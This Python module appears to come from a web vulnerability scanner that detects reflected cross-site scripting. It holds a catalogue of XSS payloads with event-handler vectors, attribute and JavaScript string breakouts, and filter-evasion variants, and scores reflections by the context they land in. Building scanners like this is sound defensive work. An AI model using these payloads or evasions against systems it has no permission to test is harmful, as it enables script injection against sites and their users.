"""Reflected XSS detection engine.

For each injection point, context-targeted probes carrying a unique
canary are sent. A finding is recorded only when the *entire probe*
is reflected verbatim — any encoding neutralizes it and is not reported.

Probes are typed by the context they exploit:
  * "tag" — markup probes (`<svg onload=...>`, attribute breakouts).
    Executable in html/attribute contexts; inside a <script> block they
    need manual review (reported as Medium).
  * "js"  — JavaScript string breakouts (`';...;//`). Only meaningful
    inside a script block; inert reflections elsewhere are ignored.

The evade-* family covers the modern filter-evasion catalogue:
spaceless vectors, nested-tag stripping bypasses, case games,
entity smuggling and comment breakouts.
"""

from __future__ import annotations

import random
import string

from .http import Session, send_point

# (probe name, payload template, kinds) — {C} is replaced with the canary
XSS_PROBES = [
    # --- plain HTML context ------------------------------------------------
    ("html-script", "<script>{C}</script>", {"tag"}),
    ("html-svg", "<svg onload={C}>", {"tag"}),
    ("html-svg-quoted", '<svg onload="{C}">', {"tag"}),
    ("html-img", "<img src=x onerror={C}>", {"tag"}),
    ("html-details", "<details open ontoggle={C}>", {"tag"}),
    ("html-body", "<body onload={C}>", {"tag"}),
    ("html-iframe", '<iframe srcdoc="<svg onload={C}>">', {"tag"}),
    ("html-video", "<video><source onerror={C}>", {"tag"}),
    # --- attribute context breakouts ---------------------------------------
    ("attr-dquote", '"><svg onload={C}>', {"tag"}),
    ("attr-squote", "'><svg onload={C}>", {"tag"}),
    ("attr-nospace", '"><svg/onload={C}>', {"tag"}),
    # --- javascript context breakouts --------------------------------------
    ("js-squote", "';{C};//", {"js"}),
    ("js-dquote", '";{C};//', {"js"}),
    ("js-template", "${" + "{C}" + "}", {"js"}),
    ("js-backtick", "`;{C};//", {"js"}),
    ("script-close", "</script><svg onload={C}>", {"tag", "js"}),
    # --- filter-evasion variants -------------------------------------------
    ("evade-case", "<ScRiPt>{C}</ScRiPt>", {"tag"}),
    ("evade-nested", "<scr<script>ipt>{C}</scr</script>ipt>", {"tag"}),
    ("evade-nospace", "<svg/onload={C}>", {"tag"}),
    ("evade-tab", "<svg\tonload={C}>", {"tag"}),
    ("evade-entity", "&#x3c;svg onload={C}&#x3e;", {"tag"}),
    ("evade-comment", "<!--><svg onload={C}>", {"tag"}),
]

# level 1 runs the reliable core; higher levels add the evasion catalogue
LEVEL_CUTOFF = {
    1: 16,  # through script-close
    2: 20,  # + first evasion wave
    3: len(XSS_PROBES),
}


def _context(html_text: str, idx: int, pre: str) -> str:
    """Classify where the canary landed: javascript / attribute / html.

    The probe's own pre-canary markup is stripped first so a payload's
    own <script> tag can't misclassify the context.
    """
    before = html_text[:idx]
    if pre and before.endswith(pre):
        before = before[:-len(pre)]
    low = before.lower()
    if low.rfind("<script") > low.rfind("</script>"):
        return "javascript"
    if before.rfind("<") > before.rfind(">"):
        return "attribute"
    return "html"


def scan_point(session: Session, point: dict, name: str,
               level: int = 1) -> list:
    """Test one parameter for reflected XSS; return a list of findings."""
    findings = []
    canary = "aegis" + "".join(random.choices("0123456789abcdef", k=6))
    probes = XSS_PROBES[:LEVEL_CUTOFF.get(level, len(XSS_PROBES))]

    for probe_name, template, kinds in probes:
        payload = template.replace("{C}", canary)
        resp = send_point(session, point, name, payload)
        if payload not in resp.text:
            continue  # encoded, stripped or dropped — not exploitable
        idx = resp.text.find(canary)
        pre = template.split("{C}")[0]
        ctx = _context(resp.text, idx, pre)

        if "tag" in kinds and ctx in ("html", "attribute"):
            severity = "High"
        elif "tag" in kinds and ctx == "javascript":
            severity = "Medium"  # inside a script block — verify the sink
        elif kinds == {"js"} and ctx == "javascript":
            severity = "High"
        else:
            continue  # reflected where it cannot execute

        findings.append({
            "type": "xss",
            "technique": "reflected",
            "severity": severity,
            "method": point["method"],
            "url": point["url"],
            "parameter": name,
            "payload": payload,
            "evasion": probe_name if probe_name.startswith("evade-") else None,
            "context": ctx,
            "evidence": resp.text[max(0, idx - 60):idx + len(canary) + 60]
                        .strip().replace("\n", " ")[:200],
        })
        break  # one solid proof per parameter is enough

    return findings
